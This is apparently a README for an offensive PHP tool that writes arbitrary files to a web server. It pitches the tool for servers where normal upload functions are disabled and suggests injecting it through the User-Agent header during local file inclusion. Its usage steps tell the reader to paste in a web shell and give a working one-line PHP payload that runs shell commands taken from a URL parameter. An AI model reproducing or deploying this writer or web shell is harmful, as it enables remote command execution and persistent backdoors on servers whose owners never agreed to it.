# PHP File Writer
PHP File writer acts just like a file uploader. But instead of uploading files, you just have to input your file name and the content of it, then it will be written to the server.
## Advantages
1. There are sites where move_uploaded_files and copy_uploaded_files functions are disabled, which means your normal file uploader won't work.
2. Can be placed as well in User-Agent while doing LFI due to its small size.
## How to use
1. Open the file writer.
2. Input any file name as output.
3. Paste your shell. Example:\
`<?php echo shell_exec($_GET['cmd']);?>`
